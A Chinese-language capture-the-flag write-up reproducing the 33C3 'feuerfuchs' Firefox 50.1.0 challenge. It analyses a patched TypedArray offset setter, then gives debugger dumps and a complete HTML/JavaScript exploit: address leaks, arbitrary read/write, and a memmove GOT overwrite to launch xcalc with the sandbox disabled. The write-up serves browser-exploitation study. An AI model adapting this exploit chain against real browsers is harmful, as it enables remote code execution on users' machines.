> 原文链接: https://www.anquanke.com//post/id/205721 


# firefox pwn 入门 - 33c3 feuerfuchs 复现


                                阅读量   
                                **139489**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01520225f01d5f976c.jpg)](https://p0.ssl.qhimg.com/t01520225f01d5f976c.jpg)



学习firefox上的漏洞利用, 找了`33c3ctf` saelo 出的一道题目`feuerfuchs`, 这里记录一下学习的过程， 比较基础。



## 环境搭建

firefox 版本为[`50.1.0`](https://ftp.mozilla.org/pub/firefox/releases/50.1.0/source/firefox-50.1.0.source.tar.xz),版本比较老了，在`ubuntu 1604` 下编译不会出现问题，先把源码下载下来, 题目文件在[这里](https://github.com/saelo/feuerfuchs) 下载

进入源码目录，打上patch之后编译即可,

```
// patch
root@prbv:~/firefox-50.1.0# patch -p1 &lt; feuerfuchs.patch
// 获取依赖 ， 都默认配置即可
root@prbv:~/firefox-50.1.0# ./mach bootstrap
// 编译， 完成之后在 obj-x86_64-pc-linux-gnu/dist/bin/firefox
root@prbv:~/firefox-50.1.0# ./mach build
// 安装到系统 这里是 /usr/local/bin/firefox
root@prbv:~/firefox-50.1.0# ./mach install
root@prbv:~/firefox-50.1.0# whereis firefox
firefox: /usr/lib/firefox /etc/firefox /usr/local/bin/firefox
```

搞定之后就可以直接shell 里`firefox` 启动，运行之后在`~/.mozilla/firefox` 目录下是firefox 的配置文件, 创建一个`user.js`, 设置 `user_pref("security.sandbox.content.level", 0);` ， 这样firefox 的沙箱就会关闭掉

```
root@prbv:~/.mozilla/firefox# ls
?  Crash Reports  mqj1mx8j.default-1589856246856  profiles.ini
root@prbv:~/.mozilla/firefox# cat profiles.ini 
[General]
StartWithLastProfile=1

[Profile0]
Name=default-1589856246856
IsRelative=1
Path=mqj1mx8j.default-1589856246856
Default=1


root@prbv:~/.mozilla/firefox# cat mqj1mx8j.default-1589856246856/user.js 
user_pref("security.sandbox.content.level", 0);
```

也可以在`firefox` 的`about:config` 里面查看

[![](https://p1.ssl.qhimg.com/t0100bbefefac5dddf0.png)](https://p1.ssl.qhimg.com/t0100bbefefac5dddf0.png)

文章涉及的所有文件都放在了[这里](https://github.com/rtfingc/cve-repo/tree/master/0x07-33c3-feuerfuchs-side-effect)



## 漏洞分析

### <a class="reference-link" name="patch%20%E5%88%86%E6%9E%90"></a>patch 分析

首先看看题目给出的 patch

```
diff --git a/js/src/vm/TypedArrayObject.cpp b/js/src/vm/TypedArrayObject.cpp
//...
/* static */ const JSPropertySpec
 TypedArrayObject::protoAccessors[] = `{`
-    JS_PSG("length", TypedArray_lengthGetter, 0),
     JS_PSG("buffer", TypedArray_bufferGetter, 0),
+    JS_PSGS("length", TypedArray_lengthGetter, TypedArray_lengthSetter, 0),
     JS_PSG("byteLength", TypedArray_byteLengthGetter, 0),
+    JS_PSGS("offset", TypedArray_offsetGetter, TypedArray_offsetSetter, 0),
     JS_PSG("byteOffset", TypedArray_byteOffsetGetter, 0),
     JS_PS_END
 `}`;
//............
jsapi.h:#define JS_PSGS(name, getter, setter, flags)
```

给`length` 添加了一个setter`TypedArray_lengthSetter` , 然后还多了一个 `offset` 的 getter 和 setter

`lengthSetter` 在类似`a=new Uint8Array(new ArrayBuffer(0x10)); a.length = 0x20` 的时候调用，会检查传入的 `newLength` 是否越界

```
diff --git a/js/src/vm/TypedArrayObject.h b/js/src/vm/TypedArrayObject.h
//...
+    static bool lengthSetter(JSContext* cx, Handle&lt;TypedArrayObject*&gt; tarr, uint32_t newLength) `{`
+        if (newLength &gt; tarr-&gt;length()) `{`
+            // Ensure the underlying buffer is large enough
+            ensureHasBuffer(cx, tarr);
+            ArrayBufferObjectMaybeShared* buffer = tarr-&gt;bufferEither();
            // 检查是否越界
+            if (tarr-&gt;byteOffset() + newLength * tarr-&gt;bytesPerElement() &gt; buffer-&gt;byteLength())
+                return false;
+        `}`
+
+        tarr-&gt;setFixedSlot(LENGTH_SLOT, Int32Value(newLength));
+        return true;
+    `}`
```

`offsetGetter` 就是返回`offset` 这个属性而已, `offsetSetter` 传入一个 `newOffset` , TypeArray 整体`offset + length` 为实际分配的内存大小， 如`a=new Uint8Array(new ArrayBuffer(0x60))` 这样初始化后`offset ==0; length == 0x60`, 然后假如`a.offset = 0x58`执行后，就会有`offset == 0x58; length == 0x8，` offset 为当前读写的指针， 类似文件的`lseek`

```
diff --git a/js/src/vm/TypedArrayObject.h b/js/src/vm/TypedArrayObject.h
index 6ac951a..3ae8934 100644
--- a/js/src/vm/TypedArrayObject.h
+++ b/js/src/vm/TypedArrayObject.h
@@ -135,12 +135,44 @@ class TypedArrayObject : public NativeObject
         MOZ_ASSERT(v.toInt32() &gt;= 0);
         return v;
     `}`
+    static Value offsetValue(TypedArrayObject* tarr) `{`
+        return Int32Value(tarr-&gt;getFixedSlot(BYTEOFFSET_SLOT).toInt32() / tarr-&gt;bytesPerElement());
+    `}`
+    static bool offsetSetter(JSContext* cx, Handle&lt;TypedArrayObject*&gt; tarr, uint32_t newOffset) `{`
+        // Ensure that the new offset does not extend beyond the current bounds
        // 越界检查
+        if (newOffset &gt; tarr-&gt;offset() + tarr-&gt;length())
+            return false;
+
+        int32_t diff = newOffset - tarr-&gt;offset();
+
+        ensureHasBuffer(cx, tarr);
+        uint8_t* ptr = static_cast&lt;uint8_t*&gt;(tarr-&gt;viewDataEither_());
+
+        tarr-&gt;setFixedSlot(LENGTH_SLOT, Int32Value(tarr-&gt;length() - diff));
+        tarr-&gt;setFixedSlot(BYTEOFFSET_SLOT, Int32Value(newOffset * tarr-&gt;bytesPerElement()));
+        tarr-&gt;setPrivate(ptr + diff * tarr-&gt;bytesPerElement());
+
+        return true;
+    `}`
```

到这里没有什么问题， 但是这里`offsetSetter` 没有考虑到`side-effect`的情况

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

在`js/src/builtin/TypedArray.js` 里可以找到`TypeArray` 绑定的一些函数, 主要看`TypedArrayCopyWithin` 函数，它会在`a.copyWithin(to, from, end)` 的时候调用, 作用是把`from` 到`end` 的项拷贝到`to` 开始的地方，像下面，`'c'， 'd'` 被拷贝到了 `index == 0` 处

```
js&gt; a=['a','b','c','d','e']    
["a", "b", "c", "d", "e"]      
js&gt; a.copyWithin(0,2,3)        
["c", "b", "c", "d", "e"]      
js&gt; a.copyWithin(0,2,4)        
["c", "d", "c", "d", "e"]
```

这里假设还是`a=new Uint8Array(new ArrayBuffer(0x60))` , 执行`a.copyWithin(0, 0x20,0x28)`

```
function TypedArrayCopyWithin(target, start, end = undefined) `{`
    // This function is not generic.
    if (!IsObject(this) || !IsTypedArray(this)) `{`
        return callFunction(CallTypedArrayMethodIfWrapped, this, target, start, end,
                            "TypedArrayCopyWithin");
    `}`
    GetAttachedArrayBuffer(this);

    var obj = this;
    // len == 0x60
    var len = TypedArrayLength(obj);

    var relativeTarget = ToInteger(target);
    // to == 0
    var to = relativeTarget &lt; 0 ? std_Math_max(len + relativeTarget, 0)
                                : std_Math_min(relativeTarget, len);


    var relativeStart = ToInteger(start);
    // from  == 0x20
    var from = relativeStart &lt; 0 ? std_Math_max(len + relativeStart, 0)
                                 : std_Math_min(relativeStart, len);

    var relativeEnd = end === undefined ? len
                                        : ToInteger(end);
    // final == 0x28
    var final = relativeEnd &lt; 0 ? std_Math_max(len + relativeEnd, 0)
                                : std_Math_min(relativeEnd, len);

       // count == 0x8
    var count = std_Math_min(final - from, len - to);

   //.. memmove
    if (count &gt; 0)
        MoveTypedArrayElements(obj, to | 0, from | 0, count | 0);

    // Step 18.
    return obj;
`}`
```

这里首先获取了`len == 0x60` , 然后用`ToInteger` 分别获取`start` 和 `end` 的值，这里其实就和saelo发现的jsc `cve-2016-4622` 差不多，先获取了len, 但是在`ToInteger` 里面`len` 可能会被更改，加入运行下面代码

```
a.copyWithin(`{` 
    valueOf: function() `{` 
        a.offset = 0x58 ; 
        return 0x0; 
    `}` `}`, 0x20, 0x28);
```

计算`to` 的时候`ToInteger(target);` 会先执行`ValueOf` 的代码， 完了`offset == 0x58 ; length == 0x8`, 后续的`MoveTypedArrayElements` 的读写会从`a[0x58]` 开始， 于是就有了越界。

测试一下

```
// 创建两个 ArrayBuffer， 他们内存布局上会相邻
js&gt; a=new ArrayBuffer(0x60);
js&gt; b=new ArrayBuffer(0x60);
js&gt; dumpObject(a)
object 0x7ffff7e85100 from global 0x7ffff7e85060 [global]
//...
js&gt; dumpObject(b)
object 0x7ffff7e851a0 from global 0x7ffff7e85060 [global]
//...........................
pwndbg&gt; x/40gx 0x7ffff7e85100
// a
0x7ffff7e85100: 0x00007ffff7e82880      0x00007ffff7ea9240
0x7ffff7e85110: 0x0000000000000000      0x000055555660c2e0
0x7ffff7e85120: 0x00003ffffbf428a0      0xfff8800000000060
0x7ffff7e85130: 0xfffc000000000000      0xfff8800000000000
0x7ffff7e85140: 0x0000000000000000      0x0000000000000000
0x7ffff7e85150: 0x0000000000000000      0x0000000000000000
0x7ffff7e85160: 0x0000000000000000      0x0000000000000000
0x7ffff7e85170: 0x0000000000000000      0x0000000000000000
0x7ffff7e85180: 0x0000000000000000      0x0000000000000000
0x7ffff7e85190: 0x0000000000000000      0x0000000000000000
// b
0x7ffff7e851a0: 0x00007ffff7e82880      0x00007ffff7ea9240
0x7ffff7e851b0: 0x0000000000000000      0x000055555660c2e0
0x7ffff7e851c0: 0x00003ffffbf428f0      0xfff8800000000060
0x7ffff7e851d0: 0xfffc000000000000      0xfff8800000000000
0x7ffff7e851e0: 0x0000000000000000      0x0000000000000000
0x7ffff7e851f0: 0x0000000000000000      0x0000000000000000


js&gt; test = new Uint8Array(a)                                                    
js&gt; hax = `{`valueOf: function()`{`test.offset = 0x58; return 0;`}``}`
js&gt; test.copyWithin(hax,0x20,0x28)                                                              
// 执行之后
pwndbg&gt; x/40gx 0x7ffff7e85100
// a
0x7ffff7e85100: 0x00007ffff7e82880      0x00007ffff7ea9240
0x7ffff7e85110: 0x0000000000000000      0x000055555660c2e0
0x7ffff7e85120: 0x00003ffffbf428a0      0xfff8800000000060
0x7ffff7e85130: 0xfffe7ffff3d003a0      0xfff8800000000000
0x7ffff7e85140: 0x0000000000000000      0x0000000000000000
0x7ffff7e85150: 0x0000000000000000      0x0000000000000000
0x7ffff7e85160: 0x0000000000000000      0x0000000000000000
0x7ffff7e85170: 0x0000000000000000      0x0000000000000000
0x7ffff7e85180: 0x0000000000000000      0x0000000000000000
                // offset == 0x58
0x7ffff7e85190: 0x0000000000000000      0x000055555660c2e0//&lt;==
// b
0x7ffff7e851a0: 0x00007ffff7e82880      0x00007ffff7ea9240
0x7ffff7e851b0: 0x0000000000000000      0x000055555660c2e0//&lt;===
0x7ffff7e851c0: 0x00003ffffbf428f0      0xfff8800000000060
0x7ffff7e851d0: 0xfffc000000000000      0xfff8800000000000
0x7ffff7e851e0: 0x0000000000000000      0x0000000000000000
0x7ffff7e851f0: 0x0000000000000000      0x0000000000000000
0x7ffff7e85200: 0x0000000000000000      0x0000000000000000
```

可以看到 `b` 的 `0x000055555660c2e0` 被拷贝到了`a` 的内联数据里，这样就可以用`a` 获取 `ArrayBuffer b` 中的内存地址



## 漏洞利用

### <a class="reference-link" name="%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"></a>地址泄露

通过前面分析我们了解了漏洞的基本成因和效果，接下来就是这么利用了， 前面我们可以通过`copyWithIn` 来泄露`ArrayBuffer b` 的地址, 我们需要泄露出`0x000055555660c2e0` ， 和`0x00003ffffbf428f0` 这两个地址. `0x000055555660c2e0` 在 jsshell 中指向js 的`emptyElementsHeaderShared`, 在完整的firefox 里指向 `libxul.so` ， 通过这个地址就可以泄露出 `libxul.so` 的地址。

`0x00003ffffbf428f0 &lt;&lt;1 == 0x7ffff7e851e0` 指向申请的buffer, 因为这里申请的是`0x60` 大小的，所以是以内联的方式，通过它可以泄露出`ArrayBuffer` 的地址

```
0x7ffff7e851a0: 0x00007ffff7e82880      0x00007ffff7ea9240
0x7ffff7e851b0: 0x0000000000000000      0x000055555660c2e0//&lt;===
                // data
0x7ffff7e851c0: 0x00003ffffbf428f0      0xfff8800000000060
0x7ffff7e851d0: 0xfffc000000000000      0xfff8800000000000
//....
pwndbg&gt; vmmap 0x55555660c2e0
0x555555554000     0x555557509000 r-xp  1fb5000 0      /mozilla/firefox-50.1.0/js/src/build_DBG.OBJ/js/src/shell/js
// 0x00003ffffbf428f0 &lt;&lt; 1  == 0x7ffff7e851e0
```

按照前面的描述，我们申请两个 `ArrayBuffer`

```
buffer1 =  new ArrayBuffer(0x60);
    buffer2 =  new ArrayBuffer(0x60);

    a1_8 = new Uint8Array(buffer1);
    a1_32 = new Uint32Array(buffer1);
    a1_64 = new Float64Array(buffer1);


    hax = `{` valueOf: function() `{` a1_8.offset = 0x58 ; return 0x0; `}` `}`;
    a1_8.copyWithin(hax,0x20,0x28);
    xul_base = f2i(a1_64[11]) -0x39b4bf0;
    memmove_got = xul_base + 0x000004b1f160
    //......................................
       a1_8.offset = 0;
    a1_8.copyWithin(hax,0x28,0x30);
    buffer1_base = f2i(a1_64[11])*2 - 0xe0;
    print("buffer1_base "+hex(buffer1_base));
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01864314909105809a.png)

gdb attach 上去看看

```
pwndbg&gt; x/40gx 0x7fffcb243060 
 // buffer1
0x7fffcb243060: 0x00007fffc5acb2b0      0x00007fffc5acda10          
0x7fffcb243070: 0x0000000000000000      0x00007fffeb97ebf0          
0x7fffcb243080: 0x00003fffe5921850      0xfff8800000000060          
0x7fffcb243090: 0xfffe7fffcb2180c0      0xfff8800000000000          
0x7fffcb2430a0: 0x6162636461626364      0x0000000000000000          
0x7fffcb2430b0: 0x0000000000000000      0x0000000000000000          
0x7fffcb2430c0: 0x0000000000000000      0x0000000000000000          
0x7fffcb2430d0: 0x0000000000000000      0x0000000000000000          
0x7fffcb2430e0: 0x0000000000000000      0x0000000000000000          
0x7fffcb2430f0: 0x0000000000000000      0x00003fffe59218a0  
 //buffer2
0x7fffcb243100: 0x00007fffc5acb2b0      0x00007fffc5acda10          
0x7fffcb243110: 0x0000000000000000      0x00007fffeb97ebf0          
0x7fffcb243120: 0x00003fffe59218a0      0xfff8800000000060          
0x7fffcb243130: 0xfffe7fffcb218080      0xfff8800000000000          
0x7fffcb243140: 0x3132333431323334      0x0000000000000000          
0x7fffcb243150: 0x0000000000000000      0x0000000000000000   
//....
 pwndbg&gt; vmmap 0x00007fffeb97ebf0 
 0x7fffe7fca000     0x7fffec68c000 r-xp  46c2000 0      /usr/local/lib/firefox-50.1.0/libxul.so
```

### <a class="reference-link" name="%E5%86%85%E5%AD%98%E8%AF%BB%E5%86%99"></a>内存读写

接下来我们的做法是尝试把`buffer2` 的数据指针，也就是上面的`0x00003fffe59218a0` 改掉， 然后就可以内存读写了，这里是把它改到`buffer1` 的起始地址, 也就是`0x7fffcb243060`, 写入的是`0x7fffcb243060 &gt;&gt; 1 == 0x3fffe5921830`， 保存到`buffer2` 的第一项, 指定`hax` 返回值为`0x28` ，就可以覆盖掉原来的指针

```
a1_8.offset = 0;
    hax = `{` valueOf: function() `{` a1_8.offset = 0x58 ; return 0x28; `}` `}`;
    a2_64[0]=i2f(buffer1_base/2);
    a1_8.copyWithin(hax,0x48,0x50);
    print(hex(f2i(a2_64[0])));
```

运行之后的内存布局如下(重新跑地址和前面不同)， 已经成功覆盖了， 接下来就可以用`buffer2[index] = xxx` 改 `buffer1` 的内容

```
// buffer 2
0x7fffcb243240: 0x00007fffc457abe0      0x00007fffbe951880           
0x7fffcb243250: 0x0000000000000000      0x00007fffeb97ebf0           
0x7fffcb243260: 0x00003fffe59218d0      0xfff8800000000060           
0x7fffcb243270: 0xfffe7fffcb218300      0xfff8800000000000 
// 0x00003fffe59218d0 &lt;&lt; 1
0x7fffcb243280: 0x00003fffe59218d0      0x0000000000000000           
0x7fffcb243290: 0x0000000000000000      0x0000000000000000           
0x7fffcb2432a0: 0x0000000000000000      0x0000000000000000           
0x7fffcb2432b0: 0x0000000000000000      0x0000000000000000
```

还是一样，把buffer1 的`length` 改大，然后数据的指针指向 `libxul.so` 的`memmove got` ，读一下就可以得到内存中`memmove` 的指针啦，然后就可以计算偏移算出 `libc` 的基地址。构造的任意地址读写代码如下

```
function read64(addr)`{`
        a2_32 = new Uint32Array(buffer2);
        a2_64 = new Float64Array(buffer2);
        a2_32[10]=0x1000;
        a2_64[4]=i2f(addr/2);
        leak = new Float64Array(buffer1);
        return f2i(leak[0]);
    `}`
    function write64(addr,data)`{`
        a2_32 = new Uint32Array(buffer2);
        a2_64 = new Float64Array(buffer2);
        a2_32[10]=0x1000;
        a2_64[4]=i2f(addr/2);
        towrite = new Float64Array(buffer1);
        towrite[0] = i2f(data);
    `}`
    memmove_addr =  read64(memmove_got) ;
    libc_base =  memmove_addr -  0x14d9b0;
    system_addr = libc_base + 0x0000000000045390;
    print("libc_base "+hex(libc_base));
    print("system_addr "+hex(system_addr));
```

### <a class="reference-link" name="%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"></a>代码执行

okay 现在已经有了任意地址读写的能力，基本上就可以做很多事情了， 在这个版本的firefox 下， libxul 的`memmove got` 还是放在可写的内存段, 这个时候就可以把它改成 `system` 的地址后续调用`copyWithin` 的时候就可以劫持控制流

```
pwndbg&gt; telescope 0x7fffecae9160                                                                   
00:0000│   0x7fffecae9160 —▸ 0x7ffff6e989b0 (__memmove_avx_unaligned) ◂— mov    rax, rdi           
01:0008│   0x7fffecae9168 —▸ 0x7ffff6d78e60 (tolower) ◂— lea    edx, [rdi + 0x80]                     pwndbg&gt; vmmap 0x7fffecae9160  
0x7fffecae9000     0x7fffecb40000 rw-p    57000 4b1e000 /usr/local/lib/firefox-50.1.0/libxul.so
```

想下面这样，`target` 存入`/usr/bin/xcalc` , 然后执行`target.copyWithin(0, 1);` 内存中会执行类似`memmove("/usr/bin/xcalc",1)`， 然后就可以弹计算器啦 (新版本的firefox 这里的`memmove got` 放在了rdata 段，默认不可写）

```
var target = new Uint8Array(100);
    var cmd = "/usr/bin/xcalc";
    for (var i = 0; i &lt; cmd.length; i++) `{`
            target[i] = cmd.charCodeAt(i);
        `}`
    target[cmd.length]=0;
    write64(memmove_got,system_addr);
    target.copyWithin(0, 1);
    write64(memmove_got,memmove_addr);
```



## exp

完整exp 如下

`exp.html`

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;style&gt;
    body `{`
      font-family: monospace;
    `}`
  &lt;/style&gt;

  &lt;script src="exp.js"&gt;&lt;/script&gt;
&lt;/head&gt;
&lt;body onload="pwn()"&gt;
  &lt;p&gt;Please wait...&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;
```

`exp.js`

```
var conversion_buffer = new ArrayBuffer(8);
var f64 = new Float64Array(conversion_buffer);
var i32 = new Uint32Array(conversion_buffer);

var BASE32 = 0x100000000;
function f2i(f) `{`
    f64[0] = f;
    return i32[0] + BASE32 * i32[1];
`}`

function i2f(i) `{`
    i32[0] = i % BASE32;
    i32[1] = i / BASE32;
    return f64[0];
`}`

function hex(addr)`{`
    return '0x'+addr.toString(16);
`}`
function print(msg) `{`
    console.log(msg);
    document.body.innerText += 'n[+]: '+msg ;
`}`


function pwn()`{`
    buffer1 =  new ArrayBuffer(0x60);
    buffer2 =  new ArrayBuffer(0x60);

    a1_8 = new Uint8Array(buffer1);
    a1_32 = new Uint32Array(buffer1);
    a1_64 = new Float64Array(buffer1);
    a2_8 = new Uint8Array(buffer2);
    a2_32 = new Uint32Array(buffer2);
    a2_64 = new Float64Array(buffer2);

    a1_32[0]=0x61626364;
    a1_32[1]=0x61626364;

    a2_32[0]=0x31323334;
    a2_32[1]=0x31323334;

    hax = `{` valueOf: function() `{` a1_8.offset = 0x58 ; return 0x0; `}` `}`;
    a1_8.copyWithin(hax,0x20,0x28);

    xul_base = f2i(a1_64[11]) -0x39b4bf0;
    memmove_got = xul_base + 0x000004b1f160
    print("xul_base "+hex(xul_base));
    // 0x7fffecae9160
    print("memmove_got "+hex(memmove_got));

    a1_8.offset = 0;
    a1_8.copyWithin(hax,0x28,0x30);
    buffer1_base = f2i(a1_64[11])*2 - 0xe0;
    print("buffer1_base "+hex(buffer1_base));

    a1_8.offset = 0;
    hax = `{` valueOf: function() `{` a1_8.offset = 0x58 ; return 0x28; `}` `}`;
    a2_64[0]=i2f(buffer1_base/2);
    a1_8.copyWithin(hax,0x48,0x50);
    print(hex(f2i(a2_64[0])));



    // leak libc addr
    function read64(addr)`{`
        a2_32 = new Uint32Array(buffer2);
        a2_64 = new Float64Array(buffer2);
        a2_32[10]=0x1000;
        a2_64[4]=i2f(addr/2);
        leak = new Float64Array(buffer1);
        return f2i(leak[0]);
    `}`
    function write64(addr,data)`{`
        a2_32 = new Uint32Array(buffer2);
        a2_64 = new Float64Array(buffer2);
        a2_32[10]=0x1000;
        a2_64[4]=i2f(addr/2);
        towrite = new Float64Array(buffer1);
        towrite[0] = i2f(data);
    `}`
    memmove_addr =  read64(memmove_got) ;
    libc_base =  memmove_addr -  0x14d9b0;
    system_addr = libc_base + 0x0000000000045390;
    print("libc_base "+hex(libc_base));
    print("system_addr "+hex(system_addr));

    var target = new Uint8Array(100);
    var cmd = "/usr/bin/xcalc";
    for (var i = 0; i &lt; cmd.length; i++) `{`
            target[i] = cmd.charCodeAt(i);
        `}`
    target[cmd.length]=0;
    write64(memmove_got,system_addr);
    target.copyWithin(0, 1);
    write64(memmove_got,memmove_addr);

`}`
```

### <a class="reference-link" name="%E8%BF%90%E8%A1%8C%E6%95%88%E6%9E%9C"></a>运行效果

运行效果如下, 因为这里禁用了`sandbox` 所以可以直接弹出计算器

[![](https://p0.ssl.qhimg.com/t018d1676122dbd0418.png)](https://p0.ssl.qhimg.com/t018d1676122dbd0418.png)



## 小结

这里主要是复现了33c3 的`feuerfuchs` 这道题目，作为入门的case study，漏洞也是比较经典的类型, 整体来说还不错。

saelo 有给出了题目的[`docker 环境`](https://github.com/saelo/feuerfuchs) , 里面的环境的配置也是十分值得学习。



## reference

[https://bruce30262.github.io/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/#reference](https://bruce30262.github.io/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/#reference)

[https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/#kaizenjs](https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/#kaizenjs)

[https://github.com/m1ghtym0/write-ups/tree/master/browser/33c3ctf-feuerfuchs](https://github.com/m1ghtym0/write-ups/tree/master/browser/33c3ctf-feuerfuchs)

[https://github.com/saelo/feuerfuchs](https://github.com/saelo/feuerfuchs)
